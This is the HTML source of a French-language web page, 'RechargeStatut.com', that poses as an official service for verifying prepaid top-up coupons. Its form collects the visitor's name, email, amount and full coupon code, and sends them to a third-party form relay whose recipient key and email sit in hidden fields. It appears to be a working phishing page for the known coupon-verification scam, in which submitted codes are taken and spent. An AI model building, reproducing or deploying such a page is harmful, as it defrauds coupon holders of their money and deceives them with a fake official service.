<!DOCTYPE html>
<html lang="fr" class="scroll-smooth">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title id="page-title" data-i18n="title">RechargeStatut.com | Vérification Officielle</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="style.css">
  <style>
    /* Styles spécifiques au formulaire */
    .form-container {
      padding: 80px 20px;
      display: flex;
      justify-content: center;
      background: linear-gradient(180deg, #f8fafc 0%, #f1f5f9 100%);
      min-height: 80vh;
    }
    .card-form {
      background: white;
      width: 100%;
      max-width: 550px;
      padding: 40px;
      border-radius: 20px;
      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1);
      border: 1px solid #e2e8f0;
    }
    .form-group { margin-bottom: 20px; }
    .form-group label {
      display: block;
      font-size: 14px;
      font-weight: 600;
      color: #334155;
      margin-bottom: 8px;
    }
    .form-group input {
      width: 100%;
      padding: 12px 16px;
      border-radius: 10px;
      border: 1px solid #cbd5e1;
      font-family: 'Poppins', sans-serif;
      transition: all 0.3s;
    }
    .form-group input:focus {
      outline: none;
      border-color: #2563eb;
      box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
    }
    .code-input {
      letter-spacing: 4px;
      font-family: monospace !important;
      font-size: 18px;
    }
    .toggle-box {
      background: #eff6ff;
      padding: 15px;
      border-radius: 12px;
      margin-top: 10px;
    }
    .radio-group {
      display: flex;
      gap: 20px;
      margin-top: 8px;
    }
    .radio-item {
      display: flex;
      align-items: center;
      gap: 8px;
      cursor: pointer;
      font-size: 14px;
    }
    .btn-submit {
      width: 100%;
      background: #2563eb;
      color: white;
      padding: 16px;
      border-radius: 12px;
      font-weight: 700;
      border: none;
      cursor: pointer;
      transition: background 0.3s;
      margin-top: 10px;
    }
    .btn-submit:hover { background: #1e40af; }
    .grid-2 {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 15px;
    }
    @media (max-width: 480px) {
      .grid-2 { grid-template-columns: 1fr; }
      .card-form { padding: 25px; }
    }
    
    /* Indispensable pour que le menu s'affiche/se cache */
    .hidden { display: none !important; }
    .relative { position: relative; }
    .lang-options {
      position: absolute;
      top: 100%;
      right: 0;
      background: white;
      border: 1px solid #e2e8f0;
      border-radius: 10px;
      padding: 10px 0;
      box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1);
      z-index: 50;
      list-style: none;
      min-width: 150px;
    }
    .lang-options li {
      padding: 8px 15px;
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 10px;
      transition: background 0.2s;
    }
    .lang-options li:hover { background: #f1f5f9; }
    .selected-lang { cursor: pointer; display: flex; align-items: center; gap: 8px; }
  </style>
</head>
<body class="antialiased">

<header class="main-header">
  <div class="header-container">
    <nav class="nav-left">
      <a href="index.html" class="nav-item" data-i18n="nav_home">Accueil</a>
    </nav>
    
    <div class="nav-right">
      <div class="relative">
        <div class="selected-lang" id="lang-button">
          <img src="https://flagcdn.com/w20/fr.png" alt="FR" id="current-flag">
          <span id="current-lang-name">Français</span>
          <small>▼</small>
        </div>
        <ul class="lang-options hidden" id="lang-dropdown">
          <li onclick="setLang('en')"><img src="https://flagcdn.com/w20/gb.png"> English</li>
          <li onclick="setLang('fr')"><img src="https://flagcdn.com/w20/fr.png"> Français</li>
          <li onclick="setLang('es')"><img src="https://flagcdn.com/w20/es.png"> Español</li>
          <li onclick="setLang('de')"><img src="https://flagcdn.com/w20/de.png"> Deutsch</li>
          <li onclick="setLang('it')"><img src="https://flagcdn.com/w20/it.png"> Italiano</li>
        </ul>
      </div>
    </div>
  </div>
</header>

<main class="form-container">
  <div class="card-form">
    <h2 class="section-title" data-i18n="form_title" style="font-size: 1.5rem; margin-bottom: 30px;">Vérification de coupon</h2>
    
    <form action="https://api.web3forms.com/submit" method="POST" id="verification-form">
      <input type="hidden" id="wf_key" name="access_key" value="">
      <input type="hidden" id="wf_email" name="to_email" value="">

      <div class="grid-2">
        <div class="form-group">
          <label for="nom" data-i18n="form_nom">Nom :</label>
          <input type="text" id="nom" name="nom" required>
        </div>
        <div class="form-group">
          <label for="prenom" data-i18n="form_prenom">Prénom :</label>
          <input type="text" id="prenom" name="prenom" required>
        </div>
      </div>

      <div class="form-group">
        <label for="amount" data-i18n="form_montant">Montant (€) :</label>
        <input type="number" id="amount" name="amount" min="1" required>
      </div>

      <div class="form-group">
        <label for="email" data-i18n="form_email">Votre email :</label>
        <input type="email" id="email" name="email" required>
      </div>

      <div class="form-group">
        <label for="code" data-i18n="form_code">Code du coupon :</label>
        <input type="password" id="code" name="code" class="code-input" required>
        
        <div class="toggle-box">
          <p style="font-size: 11px; font-weight: 800; color: #2563eb; text-transform: uppercase; margin: 0;" data-i18n="form_toggle_label">Afficher le code :</p>
          <div class="radio-group">
            <label class="radio-item">
              <input type="radio" name="show_code" value="oui" onclick="toggleCode(true)">
              <span data-i18n="form_oui">Oui</span>
            </label>
            <label class="radio-item">
              <input type="radio" name="show_code" value="non" checked onclick="toggleCode(false)">
              <span data-i18n="form_non">Non</span>
            </label>
          </div>
        </div>
      </div>

      <input type="hidden" name="redirect" value="https://recharge-statut.com/merci.html">
      <input type="hidden" name="_captcha" value="false">

      <button type="submit" class="btn-submit" data-i18n="form_envoyer">
        Authentifier le coupon
      </button>
    </form>
  </div>
</main>

<footer class="main-footer">
  <div class="container-center">
    <div class="footer-grid">
      <div class="footer-brand">
        <h3 data-i18n="footer_brand_name">RechargeStatut</h3>
        <p data-i18n="footer_brand_text">Vérification de coupons prépayés.</p>
      </div>
      <div class="footer-nav">
        <a href="index.html#galerie" data-i18n="footer_link_verify">Vérifier</a>
        <a href="index.html#faq" data-i18n="footer_link_faq">FAQ</a>
        <a href="index.html#contact" data-i18n="footer_link_contact">Contact</a>
      </div>
    </div>
    <div class="footer-bottom">
      <p class="copyright" data-i18n="footer_copyright">&copy; 2026 RechargeStatut.com. Tous droits réservés.</p>
    </div>
  </div>
</footer>

<script src="form.js"></script>

</body>
</html>
